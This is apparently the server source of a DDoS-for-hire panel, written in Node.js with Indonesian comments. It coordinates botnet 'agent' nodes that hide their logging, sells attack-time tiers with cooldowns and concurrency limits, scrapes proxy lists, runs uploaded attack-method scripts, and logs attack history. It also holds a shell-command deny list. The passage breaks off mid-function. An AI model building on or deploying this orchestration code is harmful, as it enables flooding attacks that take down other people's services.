require('dotenv').config();
const os = require('os');
const fs = require('fs');
const path = require('path');
const express = require('express');
const http = require('http');
const https = require('https');
const crypto = require('crypto');
const { execSync, spawn } = require('child_process');
const multer = require('multer');
const axios = require('axios');
axios.defaults.timeout = 18000;
axios.interceptors.response.use(
  res => res,
  err => {
    return Promise.reject(err);
  }
);
const FormData = require('form-data');
const whois = require('whois-json');
const net = require('net');
const bcrypt = require('bcrypt');
const pidusage = require('pidusage');
const xss = require('xss-clean');
const compression = require('compression');
const localtunnel = require('localtunnel');
const cookieParser = require('cookie-parser');
const cookieSignature = require('cookie-signature');
const WebSocket = require('ws');
const pLimit = require('p-limit');
const winston = require('winston');
const dns = require('dns').promises;
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
const dataDir = path.join(__dirname, 'data');

const { createLogger, transports } = winston;
const { combine, timestamp, printf } = winston.format;
const logger = createLogger({
  level: 'info',
  format: combine(
    timestamp(),
    printf(({ timestamp, level, message, ...meta }) =>
      `[${timestamp}] [${level.toUpperCase()}] ${message} ${Object.keys(meta).length ? JSON.stringify(meta) : ''}`
    )
  ),
  transports: [
    new transports.File({ filename: path.join(dataDir, 'activity.log'), maxsize: 5 * 1024 * 1024, maxFiles: 3, tailable: true }),
  ]
});

const CONFIG_URL = process.env.CONFIG_URL || "https://botapi.ihsan83636.workers.dev";
const port = process.env.PORT || process.env.SERVER_PORT || 2090;
const NODE_TYPE = process.env.NODE_TYPE || 'master';

if (NODE_TYPE === 'agent') {
  global.DISABLE_LOG = true;
  console.log = () => {};
  console.info = () => {};
  console.warn = () => {};
  console.error = () => {};

  global.broadcastWS = () => {};
  global.skipAgentMonitor = true;
}

let AUTO_DELETE_AGENT = false;
let MASTER_ATTACK_SELF = false;
let SUPABASE_URL = "";
let SUPABASE_API_KEY = "";
let MASTER_URL = "";
let TELEGRAM_BOT_TOKEN = "";
let TELEGRAM_CHAT_ID = "";
let apiKey = "";
let AGENT_KEY = "";
let DEFAULT_PHOTO_URL = "";
let COOKIE_SECRET = '';
let supabase = null;

const FILE_CACHE_TTLS = {
  'online_users.json': 5 * 1000,
  'attack_history.json': 5 * 1000,
  'agents.json': 500,
};
const methodsPath = path.join(dataDir, 'methods.json');
const agentsPath = path.join(dataDir, 'agents.json');
const newsPath = path.join(dataDir, 'news.json');
const historyPath = path.join(dataDir, 'attack_history.json');
const uploadDir = path.join(__dirname, 'lib', 'method');
const fingerprintFile = path.join(dataDir, 'agent_fingerprint.txt');
const onlineUserPath = path.join(dataDir, 'online_users.json');
const configPath = path.join(dataDir, 'config.json');
const PLUGINS_DIR = path.join(__dirname, 'plugins');
if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir, { recursive: true });
if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });

const SCRAPE_SOURCES = [
  { url: 'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=4000&country=all&ssl=all&anonymity=all', proto: 'http' },
  { url: 'https://raw.githubusercontent.com/officialputuid/KangProxy/refs/heads/KangProxy/https/https.txt', proto: 'https' },
  { url: 'https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=4000&country=all&ssl=all&anonymity=all', proto: 'socks4' },
  { url: 'https://raw.githubusercontent.com/officialputuid/KangProxy/refs/heads/KangProxy/http/http.txt', proto: 'http'},
  { url: 'https://raw.githubusercontent.com/dpangestuw/Free-Proxy/refs/heads/main/socks5_proxies.txt', proto: 'socks5' },
  { url: 'https://raw.githubusercontent.com/casa-ls/proxy-list/refs/heads/main/socks5', proto: 'socks5' },
  { url: 'https://raw.githubusercontent.com/officialputuid/KangProxy/refs/heads/KangProxy/socks5/socks5.txt', proto: 'socks5' },
  { url: 'https://raw.githubusercontent.com/Vann-Dev/proxy-list/refs/heads/main/proxies/socks4.txt', proto: 'socks4' },
  { url: 'https://raw.githubusercontent.com/officialputuid/KangProxy/refs/heads/KangProxy/socks4/socks4.txt', proto: 'socks4' },
  { url: 'https://raw.githubusercontent.com/proxifly/free-proxy-list/refs/heads/main/proxies/all/data.txt', proto: 'mix' },
  { url: 'https://spys.me/proxy.txt', proto: 'mix' }
];
// ======================= GLOBAL STATE =======================
const app = express();
const httpServer = http.createServer(app);

let AGENT_LIST = [];
global.LAST_AGENT_STATUS = {};
global.DISABLE_LOG = false;
let localTunnelUrl = null;
let currentTunnel = null;
let LAST_REGISTERED = { name: null, url: null };
const MAX_FILE_SIZE = 350 * 1024;
const activeProcesses = {};
const agentProcessMap = {};
const stats = {};
const writeQueue = new Map();
const writeQueueLocks = new Map();
const pendingWrites = new Set();
const fileCache = new Map();
const lastAttackTimestamps = {};
const fileLocks = new Map();
const processLocks = new Map();
const agentDataLock = { locked: false };
const userCooldownLocks = new Map();
const CACHE_TTL = 2 * 60 * 1000;
let _cachedMethods = null;
let _lastMethodsRead = 0;
const METHOD_CACHE_TTL = 5 * 60 * 1000;
let _cachedConfig = null;
let _lastConfigRead = 0;
const CONFIG_CACHE_TTL = 5 * 60 * 1000;
let DANGEROUS_KEYWORDS = readConfig()?.dangerous_keywords || [];
// ======================= FUNGSI UTILITAS =======================
async function withFileLock(filepath, fn) {
  // Tunggu kalau ada proses lain yang sedang menulis file ini
  while (fileLocks.get(filepath)) {
    await new Promise(r => setTimeout(r, 10));
  }
  fileLocks.set(filepath, true);
  try {
    return await fn();
  } finally {
    fileLocks.delete(filepath);
  }
}

async function debounceWrite(filepath, data, delay = 2000) {
  if (!writeQueueLocks.has(filepath)) {
    writeQueueLocks.set(filepath, { timer: null, pendingData: null, version: 0 });
  }
  const lock = writeQueueLocks.get(filepath);

  // Set data terbaru dan versi terbaru
  lock.pendingData = data;
  lock.version++;

  if (lock.timer) clearTimeout(lock.timer);

  const currentVersion = lock.version; // Simpan versi ini di timer

  return new Promise((resolve) => {
    lock.timer = setTimeout(async () => {
      // Pastikan ini timer terbaru sebelum menulis
      if (currentVersion !== lock.version) {
        return resolve(false); // Abaikan karena sudah ada data baru
      }

      await withFileLock(filepath, async () => {
        const serialized = JSON.stringify(lock.pendingData, null, 2);
        const tempPath = filepath + '.' + Date.now() + '.tmp';
        await fs.promises.writeFile(tempPath, serialized, 'utf8');
        await fs.promises.rename(tempPath, filepath);
        fileCache.delete(filepath);
      }).catch(e => {
        logActivity("DEBOUNCE_WRITE_ERROR", { filepath, error: e.message });
        resolve(false);
        return;
      });
      resolve(true);
    }, delay);
  });
}

async function withProcessLock(processId, fn) {
  while (processLocks.get(processId)) {
    await new Promise(r => setTimeout(r, 5));
  }
  processLocks.set(processId, true);
  try {
    return await fn();
  } finally {
    processLocks.delete(processId);
  }
}

async function withAgentDataLock(fn) {
  const startWait = Date.now();

  while (agentDataLock.locked) {
    if (Date.now() - startWait > 2000) { // 2 detik nunggu
      logActivity("AGENT_DATA_LOCK_WAIT_TOO_LONG", { waitedMs: Date.now() - startWait });
    }
    await new Promise(r => setTimeout(r, 5));
  }

  agentDataLock.locked = true;
  logActivity("AGENT_DATA_LOCK_ACQUIRED", { time: new Date().toISOString() });

  try {
    return await fn();
  } finally {
    agentDataLock.locked = false;
    logActivity("AGENT_DATA_LOCK_RELEASED", { time: new Date().toISOString() });
  }
}

async function withUserCooldownLock(username, fn) {
  while (userCooldownLocks.get(username)) {
    await new Promise(r => setTimeout(r, 5));
  }
  userCooldownLocks.set(username, true);
  try {
    return await fn();
  } finally {
    userCooldownLocks.delete(username);
  }
}
// ======================= PLUGIN SYSTEM =======================
const loadedPlugins = {};

function loadPlugins() {
  if (!fs.existsSync(PLUGINS_DIR)) {
    fs.mkdirSync(PLUGINS_DIR, { recursive: true });
    logActivity("PLUGINS_DIR_CREATED", { path: PLUGINS_DIR });
    return;
  }

  const pluginFiles = fs.readdirSync(PLUGINS_DIR)
    .filter(file => file.endsWith('.js') && !file.startsWith('_'));

  const disabledPlugins = readConfig()?.disabledPlugins || [];

  for (const file of pluginFiles) {
    try {
      const pluginName = path.basename(file, '.js');
      
      if (disabledPlugins.includes(pluginName)) {
        logActivity("PLUGIN_SKIPPED_DISABLED", { plugin: pluginName });
        continue;
      }

      if (loadedPlugins[pluginName]) continue;

      const pluginPath = path.join(PLUGINS_DIR, file);
      logActivity("LOADING_PLUGIN", { file, path: pluginPath });
      
      delete require.cache[require.resolve(pluginPath)];
      
      const plugin = require(pluginPath);
      
      if (typeof plugin.init !== 'function') {
        throw new Error("Plugin harus mengekspor fungsi init()");
      }

      const initResult = plugin.init({
        app,
        supabase,
        axios,
        logger: logActivity,
        config: readConfig(),
        methods: readMethods(),
        agents: AGENT_LIST,
        broadcastWS,
        wss,
        uploadDir,
        dataDir
      });

      if (initResult && typeof initResult.then === 'function') {
        initResult.catch(e => {
          logActivity("PLUGIN_INIT_ASYNC_ERROR", {
            plugin: file,
            error: e.message,
            stack: e.stack
          });
        });
      }

      loadedPlugins[pluginName] = plugin;
      logActivity("PLUGIN_LOAD_SUCCESS", { plugin: file });
    } catch (e) {
      logActivity("PLUGIN_LOAD_FAILED", {
        plugin: file,
        error: e.message,
        stack: e.stack
      });
      console.error(`Gagal memuat plugin ${file}:`, e);
    }
  }
}

function updatePluginsWithWSS() {
  for (const pluginName in loadedPlugins) {
    if (loadedPlugins[pluginName].updateWSS && typeof loadedPlugins[pluginName].updateWSS === 'function') {
      try {
        loadedPlugins[pluginName].updateWSS(wss);
      } catch (e) {
        logActivity("PLUGIN_UPDATE_WSS_ERROR", {
          plugin: pluginName,
          error: e.message
        });
      }
    }
  }
}

function reloadAllPlugins() {
  const results = {};
  const disabledPlugins = readConfig()?.disabledPlugins || [];
  
  for (const pluginName in loadedPlugins) {
    if (loadedPlugins[pluginName].cleanup) {
      try {
        loadedPlugins[pluginName].cleanup();
        results[pluginName] = { cleanup: 'success' };
      } catch (e) {
        results[pluginName] = { cleanup: 'failed', error: e.message };
        logActivity("PLUGIN_CLEANUP_ERROR", {
          plugin: pluginName,
          error: e.message
        });
      }
    }
    
    delete loadedPlugins[pluginName];
  }
  
  const pluginFiles = fs.readdirSync(PLUGINS_DIR)
    .filter(file => file.endsWith('.js') && !file.startsWith('_'));
    
  for (const file of pluginFiles) {
    const pluginPath = path.join(PLUGINS_DIR, file);
    delete require.cache[require.resolve(pluginPath)];
  }
  
  loadPlugins();
  
  updatePluginsWithWSS();
  
  return results;
}

function unloadPlugin(pluginName) {
  if (loadedPlugins[pluginName]) {
    if (typeof loadedPlugins[pluginName].cleanup === 'function') {
      loadedPlugins[pluginName].cleanup();
    }
    delete require.cache[require.resolve(path.join(PLUGINS_DIR, `${pluginName}.js`))];
    delete loadedPlugins[pluginName];
    return true;
  }
  return false;
}

function reloadPlugin(pluginName) {
  try {
    if (!pluginName) return false;

    // Hapus dari require cache
    const pluginPath = path.join(PLUGINS_DIR, `${pluginName}.js`);
    delete require.cache[require.resolve(pluginPath)];

    // Cleanup plugin sebelumnya jika ada
    if (loadedPlugins[pluginName] && typeof loadedPlugins[pluginName].cleanup === "function") {
      try {
        loadedPlugins[pluginName].cleanup();
      } catch (e) {
        logActivity("PLUGIN_CLEANUP_ERROR", { plugin: pluginName, error: e.message });
      }
    }

    // Load ulang plugin
    const plugin = require(pluginPath);

    if (typeof plugin.init !== 'function') {
      logActivity("PLUGIN_INIT_MISSING", { plugin: pluginName });
      return false;
    }

    // Panggil init dengan parameter lengkap
    const result = plugin.init({
      app,
      supabase,
      axios,
      logger: logActivity,
      config: readConfig(),
      methods: readMethods(),
      agents: AGENT_LIST,
      broadcastWS,
      wss,
      uploadDir,
      dataDir
    });

    // Tangani async init
    if (result?.then) {
      result.catch(e => {
        logActivity("PLUGIN_INIT_ASYNC_ERROR", { plugin: pluginName, error: e.message });
      });
    }

    loadedPlugins[pluginName] = plugin;
    logActivity("PLUGIN_RELOADED", { plugin: pluginName });

    return true;
  } catch (e) {
    logActivity("PLUGIN_RELOAD_ERROR", { plugin: pluginName, error: e.message });
    return false;
  }
}

function chunkArray(arr, size) {
  const result = [];
  for (let i = 0; i < arr.length; i += size) {
    result.push(arr.slice(i, i + size));
  }
  return result;
}

const agentStatusCache = {};
const agentErrorTracker = {};

function hasChanged(agentId, newData) {
  const old = agentStatusCache[agentId];
  const json = JSON.stringify(newData);
  if (old === json) return false;
  agentStatusCache[agentId] = json;
  return true;
}

function shouldSkipAgent(agentId) {
  const fail = agentErrorTracker[agentId];
  return fail && fail.count >= 3 && (Date.now() - fail.lastFail < 2 * 60_000);
}

async function queryAgentStatus(agent, retries = 5, delay = 1000) {
  const agentId = agent.name || agent.url;

  if (shouldSkipAgent(agentId)) {
    return { status: 'skipped', agent };
  }

  try {
    const response = await axios.get(`${agent.url}/api/attack/stats`, {
      params: { key: AGENT_KEY },
      timeout: 15000, 
    });

    delete agentErrorTracker[agentId];
    return { status: 'success', agent, data: response.data };
  } catch (e) {
    if (retries > 0) {
      const newDelay = Math.min(delay * 2, 16000); 
      logActivity("QUERY_AGENT_RETRY", {
        agentId,
        retriesLeft: retries - 1,
        delay: newDelay,
        error: e.message,
      });

      await new Promise(resolve => setTimeout(resolve, delay));

      return queryAgentStatus(agent, retries - 1, newDelay);
    } else {
      if (!agentErrorTracker[agentId]) {
        agentErrorTracker[agentId] = { count: 1, lastFail: Date.now() };
      } else {
        agentErrorTracker[agentId].count++;
        agentErrorTracker[agentId].lastFail = Date.now();
      }

      logActivity("QUERY_AGENT_FAILED", {
        agentId,
        error: e.message,
      });

      return { status: 'failed', agent, error: e.message };
    }
  }
}

function readConfig() {
  const now = Date.now();
  if (_cachedConfig && (now - _lastConfigRead < CONFIG_CACHE_TTL)) {
    return _cachedConfig;
  }
  _cachedConfig = readFileJsonSafe(configPath, { 
    dangerous_keywords: [],
    disabledPlugins: []
  });
  _lastConfigRead = now;
  return _cachedConfig;
}

function writeConfig(newConfig) {
  if (!newConfig.disabledPlugins) {
    newConfig.disabledPlugins = [];
  }
  return debounceWrite(configPath, newConfig)
    .then(() => {
      _cachedConfig = newConfig;
      _lastConfigRead = Date.now();
    });
}

function generateOrReadFingerprint() {
  try {
    if (fs.existsSync(fingerprintFile)) {
      const content = fs.readFileSync(fingerprintFile, 'utf8').trim();
      if (content.length === 64) return content;
    }
  } catch (e) {
    logActivity("FINGERPRINT_READ_ERROR", { error: e.message });
  }
  const raw = `${os.hostname()}:${os.platform()}:${port}:${Date.now()}:${crypto.randomBytes(6).toString('hex')}`;
  const fp = crypto.createHash('sha256').update(raw).digest('hex');
  try {
    fs.writeFileSync(fingerprintFile, fp);
  } catch (e) {
    logActivity("FINGERPRINT_WRITE_ERROR", { error: e.message });
  }
  return fp;
}
const AGENT_FINGERPRINT = generateOrReadFingerprint();

function validateApiKey(req, res, next) {
  const key = req.headers['x-api-key'] || req.query.key || req.body.key;
  if (!key) {
    return res.status(400).json({ error: 'API key wajib disediakan' });
  }
  if (key !== apiKey && key !== AGENT_KEY) {
    return res.status(403).json({ error: 'API key tidak valid' });
  }
  next();
}

function isBlacklisted(host) {
  const config = readConfig();
  const blacklist = config.blacklist_hosts || [];
  return blacklist.some(item => host.includes(item));
}

function validateBlacklist(req, res, next) {
  const host = req.query.host || req.body.host;
  if (!host) return res.status(400).json({ error: 'Target host/IP tidak disediakan' });

  if (isBlacklisted(host)) {
    return res.status(403).json({ error: `Target "${host}" masuk daftar blacklist.` });
  }
  next();
}

function validateFileName(req, res, next) {
  const filename = req.params.filename || req.body.filename || req.body.newName;
  if (!isValidFileName(filename)) {
    return res.status(400).json({ error: 'Nama file tidak valid' });
  }
  next();
}

function requireAdmin(req, res, next) {
  if (!req.user || req.user.role !== 'admin') {
    return res.redirect('/admin-only');
  }
  next();
}

function requireRoleLimit() {
  const roleLimits = {
    basic: { minTime: 1, maxTime: 60, maxConcurrent: 2 },
    vip:   { minTime: 1, maxTime: 300, maxConcurrent: 5 },
    vvip:  { minTime: 1, maxTime: 750, maxConcurrent: 10 },
    mvp:   { minTime: 1, maxTime: 1800, maxConcurrent: 15 },
    admin: { minTime: 0, maxTime: Infinity, maxConcurrent: Infinity }
  };

  return async (req, res, next) => {
    if (NODE_TYPE === 'agent') return next();

    const { time, concurrent, user } = req.query;
    if (!user) {
      req.userRole = 'basic';
      return next();
    }

    await withUserCooldownLock(user, async () => {
      const { data, error } = await supabase
        .from('users')
        .select('role, banned, expired_at, custom_concurrent, custom_time')
        .eq('username', user)
        .single();

      if (error || !data) return res.status(403).send('User tidak dikenali');
      if (data.banned) return res.status(403).send('Akun ini diblokir');

      if (['vip', 'vvip', 'mvp'].includes(data.role) && data.expired_at && new Date(data.expired_at) < new Date()) {
        return res.status(403).send('Akun ini telah expired');
      }

      const role = data.role || 'basic';
      req.userRole = role;

      const cooldownPerRole = {
        basic: 120,
        vip: 80,
        vvip: 65,
        mvp: 45,
        admin: 0
      };

      const now = Date.now();
      const last = lastAttackTimestamps[user];
      const cooldown = cooldownPerRole[role] || 10;

      if (last && now - last < cooldown * 1000) {
        const remaining = ((cooldown * 1000 - (now - last)) / 1000).toFixed(1);
        return res.status(429).send(`Tunggu ${remaining}s sebelum serangan berikutnya`);
      }

      // Update timestamp dalam lock supaya tidak bentrok
      lastAttackTimestamps[user] = now;

      const limits = { ...roleLimits[role] };
      if (!isNaN(data.custom_time)) limits.maxTime = data.custom_time;
      if (!isNaN(data.custom_concurrent)) limits.maxConcurrent = data.custom_concurrent;

      const duration = parseInt(time, 10);
      const reqConcurrent = parseInt(concurrent, 10);

      if (limits.maxTime !== Infinity && duration > limits.maxTime) {
        return res.status(400).send(`Durasi maksimal untuk ${role.toUpperCase()} adalah ${limits.maxTime} detik`);
      }

      if (!isNaN(reqConcurrent) && reqConcurrent > limits.maxConcurrent) {
        return res.status(400).send(`Maksimal concurrent untuk ${role.toUpperCase()} adalah ${limits.maxConcurrent}`);
      }

      next();
    });
  };
}

function disableIfAgent(message = 'Fitur ini hanya tersedia di node master') {
  return (req, res, next) => {
    if (NODE_TYPE === 'agent') {
      console.log('[DEBUG] Diblokir karena agent');
      return res.status(403).json({ error: message });
    }
    next();
  };
}

async function requireLogin(req, res, next) {
  const signed = req.cookies?.user;
  if (!signed) return res.redirect('/login');

  const unsigned = cookieSignature.unsign(signed, COOKIE_SECRET);
  if (!unsigned) return res.redirect('/login');

  const { data: user, error } = await supabase
    .from('users')
    .select('username, role, banned, expired_at')
    .eq('username', unsigned)
    .single();

  if (error || !user) return res.redirect('/login');

  if (user.banned === true) {
    return res.redirect('/banned');
  }
  req.user = user;
  next();
}

function getSafeFilePath(baseDir, filename) {
  if (!isValidFileName(filename) || filename.startsWith('.')) {
    throw new Error('Nama file tidak valid');
  }
  const resolved = path.resolve(baseDir, filename);
  if (!resolved.startsWith(path.resolve(baseDir))) {
    throw new Error('Akses file tidak diizinkan');
  }
  return resolved;
}

function isForbiddenShell(command) {
  const forbidden = [
    /\brm\b/i,
    /\breboot\b/i,
    /\bshutdown\b/i,
    /\binit\b/i,
    /\bdd\b/i,
    /\bmkfs\b/i,
    /\bpasswd\b/i,
  ];
  return forbidden.some(pattern => pattern.test(command));
}

function isValidPort(port) {
  const n = Number(port);
  return Number.isInteger(n) && n >= 1 && n <= 65535;
}

function handleUploadCollisionAndMove(originalName, tempPath) {
  const ext = path.extname(originalName);
  const base = path.basename(originalName, ext);
  let finalName = originalName;
  let destPath = path.join(uploadDir, finalName);
  let count = 1;
  while (fs.existsSync(destPath)) {
    finalName = `${base}_${Date.now()}_${count}${ext}`;
    destPath = path.join(uploadDir, finalName);
    count++;
  }
  fs.renameSync(tempPath, destPath);
  return { finalName, destPath };
}

function sandboxCommandExecution(scriptPath, args) {
  return spawn('node', [scriptPath, ...args]);
}

function safeWriteFile(filepath, content) {
  const tempPath = filepath + '.' + Date.now() + '.tmp';
  try {
    fs.writeFileSync(tempPath, content);
    fs.renameSync(tempPath, filepath);
  } catch (e) {
    logActivity("SAFE_WRITE_FAIL", { filepath, error: e.message });
    try {
      if (fs.existsSync(tempPath)) fs.unlinkSync(tempPath);
    } catch (cleanupErr) {
      logActivity("SAFE_WRITE_CLEANUP_FAIL", { filepath, error: cleanupErr.message });
    }
  }
}

function escapeTelegram(text) {
  if (!text) return '';
  return text
    .replace(/\\/g, '\\\\')
    .replace(/_/g, '\\_')
    .replace(/\*/g, '\\*')
    .replace(/\[/g, '\\[')
    .replace(/\]/g, '\\]')
    .replace(/\(/g, '\\(')
    .replace(/\)/g, '\\)')
    .replace(/~/g, '\\~')
    .replace(/`/g, '\\`')
    .replace(/>/g, '\\>')
    .replace(/#/g, '\\#')
    .replace(/\+/g, '\\+')
    .replace(/-/g, '\\-')
    .replace(/=/g, '\\=')
    .replace(/\|/g, '\\|')
    .replace(/{/g, '\\{')
    .replace(/}/g, '\\}')
    .replace(/\./g, '\\.')
    .replace(/!/g, '\\!')
    .replace(/```/g, '\\`\\`\\`');
}

function isValidFileName(name) {
  return /^[a-zA-Z0-9_\-\.]+$/.test(name) && !name.includes('..') && !name.startsWith('.');
}

function logActivity(action, data) {
  if (global.DISABLE_LOG) return;
  logger.info(action, data);
}

function validateKeyAndLogin(req, res, next) {
  validateApiKey(req, res, () => requireLogin(req, res, next));
}

function readFileJsonSafe(filepath, fallback = null) {
  try {
    const now = Date.now();
    const stat = fs.statSync(filepath);
    const cached = fileCache.get(filepath);

    const filename = path.basename(filepath);
    const ttl = FILE_CACHE_TTLS[filename] || CACHE_TTL;

    if (cached && cached.mtime === stat.mtimeMs && now - cached.timestamp < ttl) {
      return cached.data;
    }

    const raw = fs.readFileSync(filepath, 'utf8');
    const parsed = JSON.parse(raw);
    fileCache.set(filepath, {
      data: parsed,
      mtime: stat.mtimeMs,
      timestamp: now
    });
    return parsed;
  } catch (e) {
    logActivity("READ_JSON_ERROR", { filepath, error: e.message });
    return fallback;
  }
}

async function writeFileJsonSafe(filepath, data) {
  if (data === undefined || data === null) {
    logActivity("WRITE_JSON_INVALID", { filepath });
    return;
  }

  await withFileLock(filepath, async () => {
    const serialized = JSON.stringify(data, null, 2);
    const tempPath = filepath + '.' + Date.now() + '.tmp';
    await fs.promises.writeFile(tempPath, serialized, 'utf8');
    await fs.promises.rename(tempPath, filepath);
    fileCache.delete(filepath);
  }).catch(e => {
    logActivity("WRITE_JSON_ERROR", { filepath, error: e.message });
  });
}

function readHistory() {
  return readFileJsonSafe(historyPath, []);
}

function writeHistory(history) {
  return debounceWrite(historyPath, history);
}

function logAttackHistory(entry) {
  const history = readHistory();
  history.unshift(entry);
  writeHistory(history);
}

let _cachedAgentScores = null;
let _lastAgentScoreTime = 0;
const AGENT_SCORE_CACHE_TTL = 10 * 1000; 

function getBestAgents(limit = 5, requireIdle = false) {
  const now = Date.now();
  if (_cachedAgentScores && now - _lastAgentScoreTime < AGENT_SCORE_CACHE_TTL) {
    return _cachedAgentScores.slice(0, limit);
  }

  const history = readHistory();
  const usageCount = {};
  const lastUsedTime = {};

  for (const entry of history) {
    const name = entry.agentName || entry.agent;
    if (!name) continue;
    usageCount[name] = (usageCount[name] || 0) + 1;
    const end = new Date(entry.endTime || entry.startTime).getTime();
    lastUsedTime[name] = Math.max(lastUsedTime[name] || 0, end);
  }

  const enabledAgents = AGENT_LIST.filter(a => a.enabled !== false);

  const scored = enabledAgents
    .map(agent => {
      const name = agent.name || agent.url;
      const status = LAST_AGENT_STATUS[name];
      if (!status || status.status !== 'success') return null;

      const procCount = status.data?.processStats ? Object.keys(status.data.processStats).length : 0;
      if (procCount >= 2) return null;
      if (requireIdle && procCount > 0) return null;

      const usage = usageCount[name] || 0;
      const lastUsed = lastUsedTime[name] || 0;
      const idle = (Date.now() - lastUsed) / 60000;
      const ping = status.data?.ping || 9999;
      const score = usage * 10 - idle + ping / 50;

      return { agent, score, procCount };
    })
    .filter(Boolean)
    .sort((a, b) => a.score - b.score)
    .map(x => x.agent);

  _cachedAgentScores = scored;
  _lastAgentScoreTime = now;

  return scored.slice(0, limit);
}

function updateAttackHistory(processId, update) {
  const history = readHistory();
  const idx = history.findIndex(h => h.processId === processId);
  if (idx !== -1) {
    const entry = history[idx];
    Object.assign(entry, update);
    writeHistory(history);
  } else {
    logActivity("UPDATE_ATTACK_HISTORY_NOT_FOUND", { processId });
  }
}

function cleanupOldHistory(days = 7) {
  const history = readHistory();
  const threshold = Date.now() - days * 24 * 60 * 60 * 1000;

  const filtered = history.filter(entry => {
    if (!entry.startTime) return true;
    const entryTime = new Date(entry.startTime).getTime();
    return entryTime >= threshold;
  });

  if (filtered.length !== history.length) {
    writeHistory(filtered);
    logActivity("CLEANUP_OLD_HISTORY", {
      removed: history.length - filtered.length,
      remaining: filtered.length
    });
  }
}

function isAgentIdle(agent) {
  const last = global.LAST_AGENT_STATUS[agent.name || agent.url];
  if (!last || !last.data || !last.data.processStats) return true;
  return Object.keys(last.data.processStats).length === 0;
}

function loadAgents() {
  AGENT_LIST = readFileJsonSafe(agentsPath, []);
}

function saveAgents() {
  writeFileJsonSafe(agentsPath, AGENT_LIST);
}

async function saveAgentsAndFlush() {
  saveAgents();
  await flushAllWrites();
}

function readMethods() {
  const now = Date.now();
  if (_cachedMethods && (now - _lastMethodsRead < METHOD_CACHE_TTL)) {
    return _cachedMethods;
  }
  _cachedMethods = readFileJsonSafe(methodsPath, {});
  _lastMethodsRead = now;
  return _cachedMethods;
}

function saveNews(news) {
  const newsData = readFileJsonSafe(newsPath, []);
  newsData.push({
    content: news,
    timestamp: new Date().toISOString()
  });
  writeFileJsonSafe(newsPath, newsData);
}

function writeMethods(methods) {
  if (typeof methods !== 'object' || methods === null) {
    throw new Error('Data methods tidak valid (bukan object)');
  }

  for (const [name, item] of Object.entries(methods)) {
    if (!item || typeof item !== 'object') {
      throw new Error(`Method "${name}" tidak valid (bukan object)`);
    }
    if (typeof item.script !== 'string' || !Array.isArray(item.args)) {
      throw new Error(`Method "${name}" harus punya "script" string dan "args" array`);
    }
  }
  writeFileJsonSafe(methodsPath, methods);
  _cachedMethods = methods;              
  _lastMethodsRead = Date.now();         
}

function parseProxyLine(line) {
  const match = line.trim().match(/^((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)\.){3}(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d):(\d{1,5})$/);
  if (!match) return null;
  if (!isValidPort(match[4])) return null;
  return match[0];
}

async function flushAllWrites() {
  const maxWait = 1000;
  const start = Date.now();

  while (pendingWrites.size > 0) {
    if (Date.now() - start > maxWait) {
      logActivity("FLUSH_TIMEOUT", { pendingCount: pendingWrites.size });
      break;
    }
    await new Promise(resolve => setTimeout(resolve, 100));
  }
}


process.on('SIGINT', async () => {
  await flushAllWrites();
  process.exit(0);
});

process.on('SIGTERM', async () => {
  await flushAllWrites();
  process.exit(0);
});

async function safeFileOperation(fn) {
  try {
    return await fn();
  } catch (e) {
    if (e.code === 'ENOSPC') {
      logActivity("DISK_FULL", { critical: true });
      await sendTelegramAlert("⚠️ Disk hampir penuh!");
    }
    throw e;
  }
}

function updateOnlineUsers(data) {
  return debounceWrite(onlineUserPath, data, 1000);
}

async function updateAgentStatus() {
  await withAgentDataLock(async () => {
    loadAgents();
    const agents = AGENT_LIST.filter(a => a.enabled !== false);
    if (agents.length === 0) return;

    const limit = pLimit(5);
    const results = await Promise.all(agents.map(agent =>
      limit(() => queryAgentStatus(agent))
    ));

    const updates = [];
    for (const res of results) {
      const agent = res.agent;
      const agentId = agent.name || agent.url;

      if (res.status === 'success') {
        if (res.data && typeof res.data === 'object' && Object.keys(res.data).length > 0) {
          LAST_AGENT_STATUS[agentId] = res;

          if (agent.enabled === false) {
            agent.enabled = true;
            logActivity("AGENT_RE_ENABLED", { agent });
            await saveAgentsAndFlush?.();
          }

          if (hasChanged(agentId, res.data)) {
            updates.push({ name: agentId, ...res });
          }
        } else {
          logActivity("AGENT_STATUS_EMPTY_DATA", { agentId, raw: res.data });
        }
      } else if (res.status === 'failed') {
        updates.push({ name: agentId, ...res });
      }
    }

    if (updates.length > 0) {
      broadcastWS({ type: 'agent_status_bulk_update', updates });
    }
  });
}

async function safeAgentRequest(url, params, timeout = 10000) {
  try {
    const response = await axios.get(url, { params, timeout });
    return { success: true, data: response.data };
  } catch (error) {
    if (error.response) {
      return { 
        success: false, 
        error: `Agent responded with ${error.response.status}` 
      };
    } else if (error.request) {
      return { 
        success: false, 
        error: 'No response from agent' 
      };
    } else {
      return { 
        success: false, 
        error: error.message 
      };
    }
  }
}

function adaptiveAgentInterval() {
  const count = AGENT_LIST.length;
  if (count < 10) return 5000;     
  if (count < 30) return 10000;   
  return 15000;                   
}

async function autoDowngradeExpiredUsers() {
  try {
      const { data: users, error } = await supabase
    .from('users')
    .select('username, role, expired_at')
    .in('role', ['vip', 'vvip', 'mvp']);

    if (error || !users) return;

    const now = new Date();

    for (const user of users) {
      if (user.expired_at && new Date(user.expired_at) < now) {
        await supabase
          .from('users')
          .update({ role: 'basic', expired_at: null })
          .eq('username', user.username);

        logActivity("AUTO_DOWNGRADE", {
          username: user.username,
          oldRole: user.role
        });

        await sendTelegramPhoto(
          `🔁 *Auto downgrade*\n` +
          `👤 *User:* \`${escapeTelegram(user.username)}\`\n` +
          `🪪 *Dari:* \`${user.role}\`\n` +
          `📉 *Menjadi:* \`basic\`\n` +
          `📅 *Status:* Expired`
        );
      }
    }
  } catch (e) {
    logActivity("AUTO_DOWNGRADE_ERROR", { error: e.message });
  }
}

function startAgentMonitorLoop() {
  const loop = async () => {
    try {
      loadAgents();             
      await updateAgentStatus(); 
    } catch (e) {
      logActivity("AGENT_MONITOR_LOOP_ERROR", { error: e.message });
    }
    setTimeout(loop, adaptiveAgentInterval());
  };
  loop();
}
if (NODE_TYPE === 'master') {
  startAgentMonitorLoop();
  setInterval(() => {
    autoDowngradeExpiredUsers();
  }, 60_000);
